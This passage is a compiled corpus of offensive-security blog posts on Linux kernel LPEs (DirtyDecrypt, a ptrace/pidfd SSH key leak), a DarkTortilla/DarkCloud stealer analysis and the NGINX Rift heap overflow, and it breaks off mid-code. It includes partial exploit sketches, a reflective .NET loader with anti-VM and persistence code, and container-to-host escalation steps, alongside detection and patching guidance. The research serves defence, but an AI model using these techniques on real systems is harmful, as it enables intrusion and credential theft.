@@ -1,34 +1,1031 @@
-# Garrett Stimpson — Security Research
+================================================================================
+GARRETTSTIMPSON.CA — SECURITY RESEARCH CORPUS
+================================================================================
+GENERATED    : 2026-05-27T14:00:32Z
+AUTHOR       : Garrett Stimpson
+SITE         : https://garrettstimpson.ca
+REPOSITORY   : https://github.com/gary23w/garrettstimpson.ca
+TOTAL POSTS  : 7
+DOMAIN       : offensive-security, vulnerability-research,
+               exploit-development, kernel-exploitation,
+               red-team, CVE-analysis, PoC-breakdown
 
-> In-the-wild exploit analysis, CVE breakdowns, and offensive security research by a 10-year industry veteran.
-> All content is published for educational and defensive purposes.
+FORMAT: Each <DOCUMENT> block contains a complete research post.
+        Use as-is for RAG retrieval or chunk per block for fine-tuning.
+        CVE fields are extracted from body text automatically.
+================================================================================
 
-This site documents real vulnerabilities as they drop — kernel LPEs, network protocol exploits, web server RCE chains, and red-team technique deep dives.
-Research includes working PoC analysis, root-cause breakdowns, detection guidance, and mitigation steps.
+<DOCUMENT id="001" type="security-research-post">
+<FRONTMATTER>
+TITLE      : DirtyDecrypt (CVE-2026-31635): How a Missing COW Guard in rxgk_decrypt_skb Hands You Root
+DATE       : 2026-05-27
+URL        : https://garrettstimpson.ca/posts/2026/05/27/dirtydecrypt-cve-2026-31635-rxgk-linux-lpe/
+CVE        : cve-2026-31635, CVE-2026-31635, CVE-2026-43500
+CATEGORIES : exploits, linux
+TAGS       : cve-2026-31635, dirtydecrypt, linux-kernel, lpe, kubernetes, rxgk, page-cache, poc
+WORD_COUNT : 1499
+EXCERPT    : A missing copy-on-write guard in Linux's RxGK subsystem lets any local user corrupt arbitrary page-cache pages and get root, no race condition required.
+</FRONTMATTER>
+<BODY>
+Third one in three weeks. At this point the Linux kernel's network-adjacent decryption paths are starting to feel less like hardened kernel code and more like a vulnerability hotline. Copy Fail dropped April 29. Dirty Frag came a week later. And now on May 18, 2026, Luna Tong and the V12 team published a working PoC for DirtyDecrypt, CVE-2026-31635, a local privilege escalation hiding inside the RxGK subsystem that most people have never heard of, running on distros they almost certainly use.
 
-## About
+This one gets under my skin for a few reasons. The bug class is similar to the others but the trigger surface is different enough to matter operationally. And the CVE attribution is a mess that deserves some unpacking before you go building detection around it.
 
-- [About Garrett Stimpson](https://garrettstimpson.ca/about/): Background, specialties (web app security, kernel exploitation, network protocol analysis, cloud/container security), and research philosophy.
+## What RxGK Actually Is
 
-## Posts
+RxGK is the GSS-API-based security layer for RxRPC, the transport protocol used by the Andrew File System client (`afs.ko`). Nobody uses AFS in production anymore. The module is still compiled into every mainline kernel and most rolling-release distributions, because `CONFIG_RXGK=y` in the build config says nothing about whether `rxrpc` is loaded at runtime. It only loads when userspace touches the AFS code path. Or when you call `modprobe rxrpc`. That second part is the problem.
 
-- [Living Off the Land in 2026: The Techniques EDR Still Misses](https://garrettstimpson.ca/posts/2026/05/25/lolbins-edr-bypass-2026/): Analysis of LOLBins and living-off-the-land techniques that evade modern EDR — io_uring, mavinject, eBPF abuse. Tags: lolbins, edr, red-team, windows, linux.
+The vulnerable function is `rxgk_decrypt_skb()`. This sits on the receive path and handles decryption of incoming socket buffers (`sk_buff`). The specific call chain during a connection setup RESPONSE packet is:
 
-- [Dirty Frag: Deterministic Root in Every Major Linux Distro](https://garrettstimpson.ca/posts/2026/05/26/dirty-frag-linux-kernel-lpe/): Two in-place decryption optimizations allow arbitrary page-cache corruption and deterministic LPE with no race window. Tags: kernel, ipsec, rxrpc, privilege-escalation.
+```
+rxgk_verify_response()
+  → rxgk_extract_token()
+    → rxgk_decrypt_skb()
+      → skb_to_sgvec()
+        → crypto_krb5_decrypt()
+```
 
-- [CVE-2026-31431: Copy Fail — 732 Bytes to Root on Every Major Linux Distro](https://garrettstimpson.ca/posts/2026/05/27/cve-2026-31431-copy-fail-linux-lpe/): AF_ALG page-cache corruption bug enabling root from 732-byte payload. Affects containers and cloud. Tags: CVE-2026-31431, AF_ALG, container-escape.
+The kernel receives a packet, builds a scatterlist from the sk_buff pages, and decrypts in place. The problem is that those pages may be aliased into the page cache of other files via `MSG_SPLICE_PAGES`. Before decryption happens, the kernel should check whether those pages are privately owned or shared, and if shared, create a private copy before writing the decrypted bytes. That copy-on-write guard is not there. The decrypt writes go straight into whatever memory backs those shared pages, which could be `/etc/shadow`, `/etc/sudoers`, a SUID binary, or any other privileged file.
 
-- [CVE-2026-42945: NGINX Rift, an 18-Year Heap Overflow With a Working RCE Chain](https://garrettstimpson.ca/posts/2026/05/27/cve-2026-42945-nginx-rift-heap-overflow-rce/): 2008-vintage two-pass rewrite engine bug leading to unauthenticated RCE via heap pool-cleanup pointer overwrite. Tags: CVE-2026-42945, nginx, heap-overflow, RCE.
+V12 describes it plainly: "rxgk pagecache write due to missing COW guard in `rxgk_decrypt_skb`." The full mechanism from the Delphos Labs analysis (Kamil Leoniak, 15 May 2026) is a bit sharper. It's not just a missing guard. It's decrypt-before-MAC over `MSG_SPLICE_PAGES`-aliased scatterlist pages, combined with an AES-CBC chosen-plaintext primitive that an attacker can drive through an attacker-controlled server key. No brute force. No timing window. You control the input well enough to write predictable bytes to the target page.
 
-- [CVE-2026-46333: How One ptrace Window Leaks Your SSH Keys](https://garrettstimpson.ca/posts/2026/05/27/cve-2026-46333-ssh-keysign-pwn/): pidfd race during process teardown exposes host SSH keys and shadow hashes to unprivileged local users. Tags: CVE-2026-46333, ptrace, pidfd, ssh.
+That is why there is no race condition here. Copy Fail needed precise timing. DirtyDecrypt does not. You set up the socket, feed it the right RESPONSE packet, and the kernel does the work.
 
-- [DirtyDecrypt (CVE-2026-31635): Missing COW Guard in rxgk_decrypt_skb](https://garrettstimpson.ca/posts/2026/05/27/dirtydecrypt-cve-2026-31635-rxgk-linux-lpe/): Missing copy-on-write guard in Linux RxGK subsystem enables arbitrary page-cache corruption and root with no race required. Tags: CVE-2026-31635, dirtydecrypt, kubernetes.
+## The CVE Attribution Problem
 
-## Tags Index
+Here is where things get annoying. The NVD entry for CVE-2026-31635 describes a different, related bug in the same code path: an inverted length check in `rxgk_verify_response()` that lets oversized RESPONSE authenticator lengths flow through to `skb_to_sgvec()`, where the kernel trips a `BUG_ON(len)`. The NVD CVSS vector for that entry reads `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`, which is a remote DoS, not a privilege escalation. The fix commits listed in the NVD record are `a2567217`, `beee051f`, and `e2f1a80d`, all published on 24 April 2026.
 
-kernel-exploitation, privilege-escalation, CVE, linux, lpe, red-team, edr-bypass, lolbins, heap-overflow, RCE, nginx, ssh, ptrace, page-cache, container-escape, cloud, kubernetes
+The LPE path, the one the V12 PoC actually exercises, is linked to CVE-2026-31635 only because the NVD record contains a link to the V12 PoC. There is no separate CVE number for DirtyDecrypt as of this writing. The effective fix for the LPE is commit `aa54b1d27fe0`, authored 8 May and committed 10 May 2026, which copies packets with shared fragments before in-place decryption. That commit is separately tied to the RxRPC side of Dirty Frag (CVE-2026-43500).
 
-## Optional
+So: two bugs, same code path, same CVE number, different fix commits, different CVSS vectors. Track both commits if you are writing detection or patch validation logic.
 
-- [RSS Feed](https://garrettstimpson.ca/feed.xml): Atom/RSS feed of all posts.
-- [Sitemap](https://garrettstimpson.ca/sitemap.xml): Full XML sitemap.
+## Who Gets Hit
+
+The short version: if your system has `CONFIG_RXGK=y` or `CONFIG_RXGK=m` in the kernel config and you have not applied the 25 April stable patches or commit `aa54b1d27fe0`, you are vulnerable.
+
+```bash
+# Check your build config
+grep RXGK /boot/config-$(uname -r)
+# or
+zcat /proc/config.gz | grep RXGK
+```
+
+If that returns `CONFIG_RXGK=y` or `CONFIG_RXGK=m`, you need to patch or apply the module blacklist workaround. If it returns `# CONFIG_RXGK is not set` or nothing at all, you are safe. Debian Stable, RHEL, and Ubuntu LTS standard kernels typically have RxGK disabled. Fedora, Arch Linux, and openSUSE Tumbleweed do not.
+
+The higher-risk population in practice is Kubernetes workers. An attacker who gets code execution inside a container on a Fedora CoreOS Rawhide worker node can:
+
+```bash
+# From inside a compromised pod
+grep RXGK /boot/config-$(uname -r)   # Check host via /proc or /host mount
+modprobe rxrpc                         # Load the module
+# Run PoC, get root on the host
+# Now you have the container runtime socket, all secrets mounted on this node, 
+# access to every other pod running here
+```
+
+Root on a Kubernetes worker is not just root on one machine. It's every secret stored on that node, every service account token, every pod running alongside you. That escalation path is what the CISA KEV addition for Copy Fail was really signaling, and DirtyDecrypt shares the same logic.
+
+## Proof of Concept
+
+The V12 PoC is publicly available in the NVD record for CVE-2026-31635 and on GitHub. The core syscall sequence looks roughly like this. I am not reproducing the full exploit, but the shape is:
+
+```c
+// Attacker opens a socket and acts as an RxRPC server
+int fd = socket(AF_RXRPC, SOCK_SEQPACKET, PF_INET);
+
+// Bind to a local port
+struct sockaddr_rxrpc srx = { ... };
+bind(fd, (struct sockaddr *)&srx, sizeof(srx));
+
+// Client initiates connection, sends RESPONSE packet
+// Server-side (attacker controls the "server" in local namespace)
+// rxgk_verify_response() → rxgk_extract_token() triggers decryption
+// AES-CBC chosen-plaintext: craft key material so decrypted bytes 
+// hit the page cache page of the target file at the target offset
+// Result: controlled 4-byte write to privileged file without COW guard
+```
+
+The AES-CBC chosen-plaintext aspect is what makes this deterministic. You control the server-side key material during the RESPONSE handshake. The kernel decrypts your data directly into the aliased page cache page. No timing. No retry loop. One shot.
+
+## Mitigation
+
+Patch first. If you cannot patch today, blacklist the modules.
+
+**Patch path:**
+
+```bash
+# Fedora
+sudo dnf upgrade --refresh kernel kernel-core kernel-modules
+sudo systemctl reboot
+
+# Arch Linux
+sudo pacman -Syu linux linux-headers
+sudo systemctl reboot
+
+# openSUSE Tumbleweed
+sudo zypper dup
+sudo systemctl reboot
+```
+
+Target kernel build date: after 25 April 2026. Or verify that commit `aa54b1d27fe0` is in the running kernel's git ancestry if you are building from source.
+
+**Module blacklist workaround (if you cannot reboot today):**
+
+```bash
+# Create the blacklist file
+sudo tee /etc/modprobe.d/no-rxgk.conf > /dev/null <<'EOF'
+# Temporary DirtyDecrypt mitigation, CVE-2026-31635
+# Remove after kernel patch is applied
+blacklist rxrpc
+blacklist esp4
+blacklist esp6
+install rxrpc /bin/false
+install esp4 /bin/false
+install esp6 /bin/false
+EOF
+
+# Unload currently active modules
+sudo modprobe -r rxrpc esp4 esp6 2>&1
+
+# Drop caches and rebuild module dependency map
+sudo depmod -a
+sudo sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
+
+# Verify nothing is loaded
+lsmod | grep -E "(rxrpc|esp4|esp6)" && echo "STILL LOADED" || echo "Clean"
+```
+
+Fair warning: blacklisting `esp4` and `esp6` breaks IPsec. StrongSwan, libreswan, anything running a site-to-site tunnel goes down. WireGuard is unaffected. Check your VPN topology before applying this in production.
+
+**Kubernetes worker nodes:**
+
+If your worker image is based on Fedora CoreOS Rawhide or an Arch-based custom build, force a node image rebuild now and drain the old nodes. If you are on Talos Linux, `talosctl upgrade --image ghcr.io/siderolabs/installer:v1.10.5` replaces the entire host image including the kernel. Bottlerocket and Flatcar Stable workers are not affected in their default kernel configurations.
+
+While you are in the cluster doing this, enforce `allowPrivilegeEscalation: false` and `runAsNonRoot: true` as pod-level defaults if you have not already. They do not stop DirtyDecrypt from executing if the attacker has a shell on the host, but they reduce the surface that gets you to that shell in the first place.
+
+---
+
+The thing that stands out about this whole "Dirty" family, Copy Fail, Dirty Frag, DirtyDecrypt, is that none of these bugs are exotic. They are missing checks in code paths that clearly should have checks. The page cache is a known shared resource. COW semantics are foundational. The fact that three separate kernel subsystems shipped decryption-path code without proper COW guards in the same six-month window suggests the audit coverage here was thin. I would not be surprised if there is a fourth one. Run your kernel config sweeps now, not after it ships.
+</BODY>
+</DOCUMENT>
+
+--------------------------------------------------------------------------------
+
+<DOCUMENT id="002" type="security-research-post">
+<FRONTMATTER>
+TITLE      : DarkTortilla Wraps DarkCloud: How a .NET Crypter Hides a Credential Stealer in a Fake Quotation Email
+DATE       : 2026-05-27
+URL        : https://garrettstimpson.ca/posts/2026/05/27/darktortilla-darkcloud-net-crypter-credential-stealer/
+CVE        : none
+CATEGORIES : malware, analysis
+TAGS       : darktortilla, darkcloud, dotnet, infostealer, reflective-loading, mitre-attack
+WORD_COUNT : 1646
+EXCERPT    : A DarkTortilla-packed .NET executable dropped on MalwareBazaar today carries a DarkCloud stealer payload that weaponizes reflective Assembly.Load() to run entirely in memory, bypassing AV and dumping browser credentials before you notice it launched.
+</FRONTMATTER>
+<BODY>
+A new sample hit MalwareBazaar this morning and it is a clean example of a two-layer attack that defenders routinely underestimate. The file, `Quotation No 550.exe`, arrived at 12:13 UTC on May 27, 2026, submitted by James_inthe_box. The outer layer is a DarkTortilla crypter, a .NET-based packer that has been quietly active since at least 2015. The inner payload, flagged by CAPE Sandbox, Intezer, and several others, is DarkCloud stealer.
+
+SHA256: `82f667e77a036edce6b6bef25fbc989fbf1f27e1bdc3ddb99b821ca9f60dd10b`
+
+Full MalwareBazaar entry: `https://bazaar.abuse.ch/sample/82f667e77a036edce6b6bef25fbc989fbf1f27e1bdc3ddb99b821ca9f60dd10b/`
+
+One thing that stands out immediately is the imphash: `f34d5f2d4577ed6d9ceec516c1f5a744`. MalwareBazaar shows that same imphash across nearly 49,000 AgentTesla samples and almost 20,000 Formbook samples. That is not a coincidence. DarkTortilla is a malware-as-a-service crypter, and operators reuse the same .NET loader skeleton to wrap whatever payload they are distributing this week.
+
+---
+
+## What Makes It Work
+
+The attack chain begins the way most credential theft operations do: a business-themed email. "Quotation No 550.exe" is designed to look like a legitimate procurement document, the kind of thing a purchasing manager opens without a second thought. The filename is the social engineering. Everything else is technical.
+
+DarkTortilla is a two-stage .NET assembly. The initial loader, a standalone PE, does not execute the real payload directly. Instead, it reads an encrypted blob, usually embedded in a .NET resource or appended to the file, decrypts it with AES or a similar symmetric cipher, and then calls `Assembly.Load()` on the raw bytes. That single call is the trick. The .NET runtime loads the decrypted DLL into memory directly, no file is written to disk, no path shows up in Prefetch, no artifact lands in `%TEMP%`. The loaded DLL is the DarkTortilla "core processor," a second .NET assembly that handles everything else.
+
+The core processor parses a configuration blob embedded within itself, which controls the behavior of the full infection chain. Before doing anything meaningful, it runs environment checks. DarkTortilla looks for common VM artifacts: MAC address prefixes associated with VirtualBox (`08:00:27`) and VMware (`00:0C:29`), registry keys under `HKLM\SOFTWARE\VMware, Inc.`, processor names containing "VBOX" or "VIRTUAL", and the presence of known analysis processes. If any check trips, the loader simply exits. This is T1497.001 (Virtualization/Sandbox Evasion: System Checks) and it works often enough that DarkTortilla has operated for over a decade without being widely burned.
+
+Once the environment passes, the core processor injects the DarkCloud payload. The injection method commonly observed in DarkCloud campaigns uses `VirtualProtect()` to mark a memory region as executable and then calls `CallWindowProc()` to redirect execution into it. This sidesteps the classic `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` pattern that most behavior engines watch for. It is not novel but it is effective. The payload runs in memory under the original process. From the OS perspective, it is still just `Quotation No 550.exe`.
+
+DarkCloud is an information stealer written in Visual Basic 6 at its core, though modern variants ship wrapped in .NET. Once active, it targets browser credential stores directly. For Chrome and Chromium-based browsers, it reads `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`, an SQLite database that stores saved passwords encrypted with DPAPI. The Windows Data Protection API ties encryption to the logged-in user account and machine, which means DarkCloud calls `CryptUnprotectData()` directly in the context of the victim process to decrypt those passwords with no external key required. For Firefox, it queries the NSS database via `SELECT a11,length(a11) FROM nssPrivate` and recovers master password-protected entries where the user has not set a strong master password. It also pulls from Gecko-based browsers, email clients (Thunderbird, Outlook profile files), FTP clients, and any crypto wallet data it can locate.
+
+Persistence is straightforward. DarkCloud writes itself to `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce` with a path pointing to a copy of the loader it drops, usually in `%APPDATA%` or `%USERPROFILE%`. RunOnce executes once on next login and removes itself afterward, so the registry entry is only visible between infection and first reboot.
+
+Before exfiltration, DarkCloud checks for analysis tools. It looks for process names including `wireshark.exe`, `fiddler.exe`, `processhacker.exe`, `tcpview.exe`, `windbg.exe`, and `processhacker.exe` in the running process list. If it finds any, it sleeps or exits. The malware also fetches the victim's public IP from a site like `showip.net` to include in the exfil package, which is useful for the operator to geolocate victims and prioritize high-value targets.
+
+The full MITRE ATT&CK coverage here: T1027 (Obfuscated Files), T1620 (Reflective Code Loading), T1497.001 (Sandbox Evasion: System Checks), T1055 (Process Injection), T1547.001 (Registry Run Keys), T1555.003 (Credentials from Web Browsers), T1056.001 (Keylogging), T1082 (System Information Discovery), T1113 (Screen Capture), T1071.001 (Web Protocols for C2 exfil).
+
+---
+
+## Educational Sample: Reflective .NET Loading Skeleton
+
+The following demonstrates the core DarkTortilla technique, `Assembly.Load()` reflective loading, without any payload. This is what the two-stage loader looks like structurally.
+
+```csharp
+// EDUCATIONAL SAMPLE — demonstrates .NET Reflective Assembly Loading
+// This is the structural pattern DarkTortilla uses to load its core processor
+// This does NOT contain any malicious payload
+// For research and defensive awareness only
+
+using System;
+using System.IO;
+using System.Reflection;
+using System.Security.Cryptography;
+
+class ReflectiveLoaderDemo
+{
+    // Anti-VM check: DarkTortilla looks for known VM MAC prefixes and registry keys
+    static bool IsVirtualEnvironment()
+    {
+        try
+        {
+            object cpuReg = Microsoft.Win32.Registry.GetValue(
+                @"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0",
+                "ProcessorNameString", "");
+            
+            string cpu = cpuReg?.ToString().ToUpperInvariant() ?? "";
+            string[] vmMarkers = { "VBOX", "VMWARE", "QEMU", "HYPERV" };
+            
+            foreach (string marker in vmMarkers)
+                if (cpu.Contains(marker)) return true;
+        }
+        catch { /* silently pass on access errors */ }
+        
+        return false;
+    }
+
+    // Stage 1: Decrypt the core processor bytes from an embedded resource
+    // In the real loader, encryptedBlob comes from a .NET resource or appended data
+    static byte[] DecryptPayload(byte[] encryptedBlob, byte[] aesKey, byte[] iv)
+    {
+        using var aes = Aes.Create();
+        aes.Key = aesKey;    // 32-byte key derived from hardcoded config value
+        aes.IV  = iv;        // 16-byte IV stored adjacent to encrypted blob
+        using var ms = new MemoryStream(encryptedBlob);
+        using var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Read);
+        using var result = new MemoryStream();
+        cs.CopyTo(result);
+        return result.ToArray();
+    }
+
+    // Stage 2: Reflective load — the key technique.
+    // Assembly.Load() takes raw bytes, no file touches disk.
+    // The loaded assembly's entry point is invoked directly in memory.
+    static void ReflectiveLoad(byte[] assemblyBytes)
+    {
+        Assembly loaded = Assembly.Load(assemblyBytes);
+        MethodInfo entry = loaded.EntryPoint;
+
+        // Invoke with empty args — real DarkTortilla passes a config struct here
+        entry?.Invoke(null, new object[] { new string[0] });
+    }
+
+    // Stage 3: RunOnce persistence — DarkCloud adds itself here post-injection
+    static void SetRunOncePersistence(string keyName, string executablePath)
+    {
+        using var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
+            @"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", writable: true);
+        key?.SetValue(keyName, $"\"{executablePath}\"");
+        // Registry entry auto-deletes after next login execution
+    }
+
+    static void Main()
+    {
+        if (IsVirtualEnvironment()) { Environment.Exit(0); return; }
+
+        // Placeholder bytes — a real loader would decrypt these from a resource
+        byte[] fakePayload   = new byte[256];  // zeroed, no real assembly
+        byte[] fakeAesKey    = new byte[32];   // zeroed key
+        byte[] fakeIv        = new byte[16];   // zeroed IV
+
+        Console.WriteLine("[demo] Reflective loading pattern shown above.");
+        Console.WriteLine("[demo] Assembly.Load() never writes a file to disk.");
+        Console.WriteLine("[demo] RunOnce key: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
+
+        // ReflectiveLoad(DecryptPayload(fakePayload, fakeAesKey, fakeIv));
+        // SetRunOncePersistence("SystemUpdateHelper", @"C:\Users\victim\AppData\Roaming\svchst.exe");
+    }
+}
+```
+
+The comment on the last two lines is the point. In the real chain, those two calls are exactly what runs. The AV-bypassing part is entirely in `Assembly.Load()`: the runtime never sees a suspicious file path, no scan hook fires on a file write, and the loaded assembly inherits the parent process's trust level. It is a primitive that .NET exposes for legitimate plugin architectures, and DarkTortilla has been abusing it for years.
+
+---
+
+## Detection and Defense
+
+The Stairwell team published a solid YARA hunting rule for DarkCloud variants in August 2025. Key strings to match include `SELECT a11,length(a11) FROM nssPrivate` (Firefox NSS query), `DarkCloud Credentials` and `DarkCloud Keylogger` (internal module names present in unobfuscated builds), and `C:\Users\Public\Libraries\vbsqlite3.dll` (a path the stealer drops its SQLite helper to). Three or more matches on the `$s*` strings or four matches on the `$c*` code-specific strings indicate a high-confidence hit.
+
+For Sysmon-based detection, the events that matter most here are Event ID 13 (Registry value set) watching for writes to `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce` by unexpected processes, Event ID 10 (Process access) for `Quotation*.exe` or similarly named business-lure processes opening `lsass.exe` or accessing Chrome's `Login Data` file, and Event ID 7 (Image loaded) watching for `clrjit.dll` and `mscorlib.dll` being loaded inside uncommon processes, which signals .NET runtime activation in something that should not be running managed code.
+
+On the network side, watch for outbound HTTP GET requests to `showip.net`, `checkip.amazonaws.com`, or similar IP-discovery services from user processes. That pattern is nearly always malware performing victim geolocation before exfil.
+
+Mitigations: restrict execution of unsigned .NET assemblies via AppLocker or WDAC policies, enable Credential Guard to protect LSASS-based secrets, and consider pushing Chrome's App-Bound Encryption (introduced in Chrome 127) which stores encryption keys in a way that blocks cross-process DPAPI abuse at the browser credential level. That last control specifically targets the `CryptUnprotectData()` bypass DarkCloud relies on.
+
+Practically speaking, this family is not going anywhere. DarkTortilla has been distributing payloads for over a decade because the combination of .NET reflective loading and layered encryption works. DarkCloud has been under active development since 2022 and is sold as a builder with configurable modules. When two mature, maintained tools combine in a single delivery, you get exactly what landed on Bazaar this morning: a 1.3MB `.exe` masquerading as a business document that empties a victim's credential store before their endpoint protection notices the loader ever ran.
+</BODY>
+</DOCUMENT>
+
+--------------------------------------------------------------------------------
+
+<DOCUMENT id="003" type="security-research-post">
+<FRONTMATTER>
+TITLE      : CVE-2026-46333: How One ptrace Window Leaks Your SSH Keys
+DATE       : 2026-05-27
+URL        : https://garrettstimpson.ca/posts/2026/05/27/cve-2026-46333-ssh-keysign-pwn/
+CVE        : CVE-2026-46333, cve-2026-46333
+CATEGORIES : exploits, linux, lpe
+TAGS       : cve, ptrace, pidfd, linux-kernel, ssh, privilege-escalation
+WORD_COUNT : 898
+EXCERPT    : A narrow window between process teardown steps lets any local user clone open file descriptors from root-owned binaries. The result: host SSH private keys, shadow password hashes, and a root shell.
+</FRONTMATTER>
+<BODY>
+There's a moment during process exit when the Linux kernel is in a weird in-between state. The task's memory descriptor has been detached. The file descriptor table hasn't been closed yet. For most things, this doesn't matter. But for a specific combination of ptrace access checks and a relatively new syscall called `pidfd_getfd`, it turns into a full credential theft primitive.
+
+That's CVE-2026-46333. Qualys published the full advisory on May 20, 2026, and named it "ssh-keysign-pwn" after the most impactful of the four exploit variants they demonstrated.
+
+## What's actually happening
+
+When a Linux process calls `exit()` or otherwise terminates, the kernel tears down its resources in a specific order. Memory mappings come down first. File descriptors close after. Between those two events there's a brief window where the task is technically dead (its `mm` struct is NULL) but its file descriptor table is still live.
+
+Here's where `ptrace` comes in. The kernel's standard `ptrace_has_perm()` check bails out early when the target's `mm` is NULL. It assumes a task without a memory descriptor can't be traced. This is fine for most ptrace operations. But `pidfd_getfd(2)` is different. That syscall was added in kernel 5.6 as a way to clone file descriptors from one process to another. It checks ptrace permissions, hits the early return when `mm` is NULL, and happily proceeds to clone whatever file descriptors the dying process still has open.
+
+So: a SUID root binary opens a sensitive file, starts shutting down, drops its memory descriptor, and in the gap before it closes its file table, any local unprivileged process can call `pidfd_getfd()` and grab a copy of that open file descriptor. Under the caller's own UID.
+
+## The four variants Qualys demonstrated
+
+The most severe is `ssh-keysign`. This binary is SUID root and opens SSH host private key files at `/etc/ssh/*_key` during normal operation. Grab the fd during the exit window and you have an open readable handle to the host's private keys. No password required.
+
+Second is `chage`, which reads `/etc/shadow` during exit. Same mechanics, different prize.
+
+Third and fourth are `pkexec` and `accounts-daemon`, both of which have their own wrinkles around credential file access during teardown.
+
+In practice the ssh-keysign variant is the one that hurts most. Host SSH private keys mean you can impersonate the server, MITM incoming SSH connections, or depending on your target environment, pivot into adjacent systems that trust the host key.
+
+## A minimal PoC sketch
+
+The basic idea is straightforward:
+
+```python
+import os, ctypes, struct
+
+# Open a pidfd handle to the target process
+# (a SUID binary that opens /etc/ssh/*_key during exit)
+target_pid = find_suid_process("ssh-keysign")
+pidfd = syscall_pidfd_open(target_pid, 0)
+
+# Spin until the process mm goes NULL (check /proc/[pid]/status)
+# At that point the kernel's ptrace permission check is bypassed
+while process_has_mm(target_pid):
+    pass
+
+# Now clone the file descriptor pointing at the SSH key
+stolen_fd = syscall_pidfd_getfd(pidfd, remote_fd_for_ssh_key, 0)
+
+# Read it out
+with os.fdopen(stolen_fd, 'rb') as f:
+    key_material = f.read()
+    print(key_material.decode())
+```
+
+The actual implementation requires knowing the remote fd number, which means either watching the target's `/proc/[pid]/fd/` directory or timing the grab after a predictable open sequence. Qualys's full PoC includes the timing logic.
+
+## Reliability
+
+What makes this interesting compared to something like Dirty Cow is that it's not a classic data race against another CPU thread. You're racing against the kernel's own teardown sequence, but the window is wide enough to be reliably exploitable. Qualys describes consistent success across test runs.
+
+## Patch status
+
+Linus merged the fix on 2026-05-14 as commit `31e62c2ebbfd`. The change adds a proper check: if the target task has no `mm`, the `pidfd_getfd` path now returns `EPERM` instead of proceeding. Debian, Fedora, RHEL, and Ubuntu have all shipped patched packages.
+
+If you're on an unpatched kernel, the fastest mitigation is restricting ptrace scope via `/proc/sys/kernel/yama/ptrace_scope`. Setting it to 1 limits ptrace to parent processes only, which closes most of the attack surface.
+
+```bash
+# Check your current Yama ptrace scope
+cat /proc/sys/kernel/yama/ptrace_scope
+
+# Temporary mitigation (survives until reboot)
+echo 1 > /proc/sys/kernel/yama/ptrace_scope
+
+# Permanent (add to sysctl.conf)
+echo "kernel.yama.ptrace_scope = 1" >> /etc/sysctl.conf
+sysctl -p
+```
+
+## Why this matters past the patch
+
+The interesting part of CVE-2026-46333 is what it reveals about `pidfd_getfd` as an attack primitive. The syscall was designed for legitimate FD passing between cooperating processes. But anytime you can grab an open fd from a more privileged process, you get that process's access level on that specific resource. No setuid bits, no capability checks, no credential transitions.
+
+What other SUID binaries open sensitive files during their exit paths? `ssh-keysign` and `chage` were the obvious ones. The bug has been in the kernel since `pidfd_getfd` was merged in 5.6. Years of exposure.
+
+Check your kernel version. Patch if you haven't.
+
+---
+
+*Based on the [Qualys advisory](https://blog.qualys.com/vulnerabilities-threat-research/2026/05/20/cve-2026-46333-local-root-privilege-escalation-and-credential-disclosure-in-the-linux-kernel-ptrace-path) published 2026-05-20 and the [CloudLinux write-up](https://blog.cloudlinux.com/ptrace-exit-race-cve-2026-46333-mitigation-and-kernel-update).*
+</BODY>
+</DOCUMENT>
+
+--------------------------------------------------------------------------------
+
+<DOCUMENT id="004" type="security-research-post">
+<FRONTMATTER>
+TITLE      : CVE-2026-42945: NGINX Rift, an 18-Year Heap Overflow With a Working RCE Chain
+DATE       : 2026-05-27
+URL        : https://garrettstimpson.ca/posts/2026/05/27/cve-2026-42945-nginx-rift-heap-overflow-rce/
+CVE        : cve-2026-42945, CVE-2026-42945
+CATEGORIES : exploits, web
+TAGS       : CVE-2026-42945, nginx, heap-overflow, RCE, heap-feng-shui, webserver, remote-exploit
+WORD_COUNT : 1426
+EXCERPT    : A two-pass script engine bug introduced in 2008 lets a remote attacker overflow the heap in any NGINX worker processing rewrite directives. The public PoC chains it to unauthenticated RCE via pool cleanup pointer overwrite and POST body spraying.
+</FRONTMATTER>
+<BODY>
+**CVE:** CVE-2026-42945  
+**CVSS:** 9.2 (Critical)  
+**Alias:** NGINX Rift  
+**Discovered by:** Zhenpeng (Leo) Lin at DepthFirst  
+**Disclosed:** May 13, 2026  
+**Affected versions:** NGINX Open Source 0.6.27 through 1.30.0, NGINX Plus R32 through R36, NGINX Ingress Controller through 5.4.1, NGINX Gateway Fabric through 2.5.1, several F5 product lines  
+**Fixed in:** NGINX 1.28.1 (stable), 1.29.0 (mainline)  
+**Public PoC:** [DepthFirstDisclosures/Nginx-Rift](https://github.com/DepthFirstDisclosures/Nginx-Rift)
+
+---
+
+Heap overflows in web servers get a lot of hype and not much working code. NGINX Rift is different. There is a public PoC demonstrating unauthenticated RCE, a video of it executing commands, and an ASLR bypass chain that the researchers held back from the initial release but have since published. This one is real.
+
+What makes the underlying bug interesting, aside from the 18-year residence time, is the root cause. It is not a missing bounds check. It is not an integer overflow. It is a state propagation error in a two-pass script engine, where an internal flag set during one directive gets used in a different context with different semantics. It is the kind of bug that slips through code review because both passes look correct in isolation.
+
+## The Two-Pass Engine
+
+NGINX's rewrite module uses a compiled script representation. When it processes a `rewrite` or `set` directive at configuration load time, it compiles the directive into a sequence of operations. At request time, it runs this sequence in two passes: first a length calculation pass that determines how much memory to allocate, then a copy pass that writes the actual data into the allocated buffer.
+
+The design is sensible. Single allocation, no repeated small allocs, predictable memory use. The catch is that both passes must compute the same length. If anything causes the copy pass to write more bytes than the length pass counted, you have a heap overflow.
+
+## The Flag That Doesn't Reset
+
+The trigger requires two directives together: a `rewrite` containing a question mark in its replacement string, followed by a `set` referencing a regex capture group. The question mark matters because it causes `ngx_http_script_start_args_code` to set `e->is_args = 1` on the script engine. This flag is never cleared.
+
+```c
+void
+ngx_http_script_start_args_code(ngx_http_script_engine_t *e)
+{
+    e->is_args = 1;
+    e->args = e->pos;
